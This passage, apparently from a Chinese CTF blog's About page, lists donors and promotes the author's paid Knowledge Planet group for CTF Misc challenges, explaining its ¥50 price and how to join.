Ynyrmm 8.88 x 💎 INFINITE 8.88 x 💎 Xunflash 6.66 x 💎 C3ngH 6.66 x 💎 1uxu4y 6.66 x 💎 酒醉太平 6.66 x 💎 1ymt1c3 6.66 x 💎 能给卑职一个明示吗 6.66 x 💎 飞 6.66 x 💎 Xeonacid 6.66 x 💎 起床学习咯 6.66 x 💎 *[] 6.66 x 💎 butt3rf1y 6.66 x 💎 场_room 6.00 x 💎 *儒 5.00 x 💎 Y. 5.00 x 💎 K 5.00 x 💎 JD 5.00 x 💎 juancake 5.00 x 💎 Z 4.99 x 💎 论 3.00 x 💎 霞 1.99 x 💎 ddl 1.99 x 💎 悠然 1.00 x 💎 AsaL1n 0.99 x 💎 GQ 0.10 x 💎 一些题外话 承蒙各位大佬的推荐和转发，最近从博客来找我交流的同好们越来越多了 但无奈个人精力有限，我可能没法及时地逐一回复，因此创建了一个知识星球：Lunatic的Misc妙妙屋 大家如果对我博客中的内容有任何问题或者有好玩的 Misc 题，都可以在我的星球里交流 同时我也邀请了一些实力强劲的 Misc 师傅作为星球的嘉宾，具体嘉宾列表可以扫码或者点击链接查看 目前星球里唯一的一条规定就是：不存在任何的技术歧视（毕竟大家都是从新手小白一点点学过来的） 如果您喜欢我的博客，并且对 CTF-Misc 方向比较感兴趣，欢迎加入我的星球一起交流 人海茫茫，相遇不易，感谢你能看到这里，博客后续也还是会照常更新，感谢各位同好们的支持 然后关于星球的定价，目前知识星球的创建门槛最低是 ¥50 并且星球官方还要从中抽水 20% ，然后微信商家服务也要扣一点（用下面Tips中的方法的话就不用） 因此 50 块钱真正到我手上的就 39，关注我博客的应该都是在校学生或者奋战在网安一线的师傅们 大家都不容易，因此星球的价格就定在平台允许的最低档 ¥50 我觉得大家进了星球以后，只要弄懂或者学会了一道 Misc 题，其实就算值回票价了 博客是我单向的输出，而星球是一个纯粹的技术交流平台，然后经常会有些国企、机关单位内部赛题 Tips: 如果扫码时显示该商户异常，涉嫌实时交易风险，说明星球这个二维码被限流了 可以搜索上面的QQ号加我好友，然后用上面的收款码收款就行（而且这样还不用被知识星球收取那20%的手续费[感谢]） ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"🎓️About","uri":"/about/"}]